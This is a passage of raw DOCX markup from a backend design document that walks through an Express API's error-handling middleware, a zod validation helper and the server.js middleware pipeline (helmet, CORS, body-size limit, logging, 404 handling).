          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>500</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>INTERNAL</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Fallback — never used directly in code, errorHandler emits it</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="160" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The handler itself — five branches</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src/middleware/errorHandler.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// errorHandler.js (abridged)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>function errorHandler(err, req, res, _next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  // 1) ZodError → 422 VALIDATION_ERROR + details[]</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (err &amp;&amp; err.name === 'ZodError' &amp;&amp; Array.isArray(err.errors)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return res.status(422).json({ error: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      code: 'VALIDATION_ERROR', message: 'Input validation failed',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      details: err.errors.map(e =&gt; ({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        path: e.path.join('.'), message: e.message, code: e.code }))</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 2) express.json body-parse error → 400 BAD_JSON</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (err &amp;&amp; err.type === 'entity.parse.failed') {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return res.status(400).json({ error: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      code: 'BAD_JSON', message: 'Request body is not valid JSON', details: null }});</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 3) express.json over-limit → 413 PAYLOAD_TOO_LARGE</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (err &amp;&amp; err.type === 'entity.too.large') {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return res.status(413).json({ error: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      code: 'PAYLOAD_TOO_LARGE', message: 'Request body exceeds 1MB limit', details: null }});</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 4) AppError (deliberate) → its statusCode</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (err instanceof AppError) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    req.log?.info?.({ code: err.code, status: err.statusCode }, 'AppError');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return res.status(err.statusCode).json({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      error: { code: err.code, message: err.message, details: err.details }});</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 5) Anything else → 500 INTERNAL; log full stack server-side; NEVER leak to client.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  req.log?.error?.({ err }, 'Unhandled error');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const isDev = process.env.NODE_ENV === 'development';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return res.status(500).json({ error: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    code: 'INTERNAL',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    message: isDev &amp;&amp; err?.message ? err.message : 'Internal server error',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    details: null }});</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>3.3  src/middleware/validate.js — Generic Zod Runner</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Turns any zod schema into Express middleware. Replaces the chosen request slice (body / query / params) with the parsed value — downstream handlers see coerced, trimmed values, never raw strings.</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src/middleware/validate.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>function validate(schema, source = 'body') {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!['body', 'query', 'params'].includes(source)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    throw new Error('validate(): source must be body|query|params');</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return function validateMiddleware(req, _res, next) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      req[source] = schema.parse(req[source]);  // throws ZodError on failure</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      next();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    } catch (err) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      next(err);  // → errorHandler → 422</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t>module.exports = validate;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>3.4  server.js Rewrite — Wiring the Pipeline</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>server.js evolves from 'minimal boot' to 'middleware in place but no routers yet'. The bottom of the file is the critical structural detail: notFoundHandler is mounted BEFORE errorHandler, so unmatched URLs flow through the same envelope as everything else.</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src/server.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('./config/env');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const logger = require('./config/logger');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>require('./config/db');</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const express = require('express');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const helmet = require('helmet');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const cors = require('cors');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const compression = require('compression');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const cookieParser = require('cookie-parser');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const pinoHttp = require('pino-http');</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const errorHandler = require('./middleware/errorHandler');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { notFoundHandler } = require('./middleware/errorHandler');</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const app = express();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.set('trust proxy', 1);         // req.ip reads X-Forwarded-For (prod Nginx)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.disable('x-powered-by');       // silence info leak</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1. helmet — CSP locked down to self + the FE origin</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(helmet({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  contentSecurityPolicy: { directives: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    defaultSrc: ["'self'"],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    connectSrc: ["'self'", env.CORS_ORIGIN],</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2. cors — credentials:true is REQUIRED for the httpOnly refresh cookie</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(cors({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  origin: env.CORS_ORIGIN,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  credentials: true,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  methods: ['GET','POST','PATCH','DELETE','OPTIONS'],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  allowedHeaders: ['Content-Type','Authorization','X-CSRF-Token'],</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  maxAge: 600,</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3. compression</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(compression());</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4. JSON body parser — 1MB cap prevents memory-exhaustion DoS</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(express.json({ limit: '1mb' }));</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5. cookie-parser</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(cookieParser());</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6. pino-http — autoLogging suppresses /healthz noise in dev</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(pinoHttp({ logger, autoLogging: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  ignore: req =&gt; env.NODE_ENV === 'development' &amp;&amp; req.url === '/healthz'</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/healthz + routers (auth in STEP 3, users in STEP 5) mount here</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.get('/healthz', (_req, res) =&gt; res.json({ ok: true, uptime: process.uptime() }));</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13a. unmatched URL → standard NOT_FOUND envelope</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(notFoundHandler);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
